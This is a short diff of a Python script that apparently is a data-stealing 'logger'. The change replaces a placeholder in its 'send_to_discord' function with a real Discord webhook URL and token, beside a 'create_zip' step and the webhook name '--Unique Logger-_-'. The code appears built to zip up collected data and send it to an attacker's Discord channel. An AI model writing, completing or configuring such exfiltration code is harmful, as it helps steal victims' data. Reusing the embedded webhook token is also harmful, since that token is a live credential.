@@ -48,7 +48,7 @@ def create_zip():
 
 # Send zip file to Discord
 def send_to_discord():
-    discord_webhook_url = "PLEASE PROVIDE WEBHOOK URL"
+    discord_webhook_url = "https://discord.com/api/webhooks/1180297923548946443/8Hl5RMbtST9GpBESButxHJ1ifYDkvlqqUPq79tEliqrlJ8P6leDIOnsi5DA8qedqg2Rk"
     webhook_name = "--Unique Logger-_-"
     webhook_avatar_url = "https://media.discordapp.net/attachments/1177429498531156078/1178174608864714874/UPFP.png?ex=65752f9c&is=6562ba9c&hm=6ce68ddcf0bd9321412c2432931cb0bcd7569f041baf277693212d77d9715ddf&=&format=webp&quality=lossless&width=671&height=671"
 
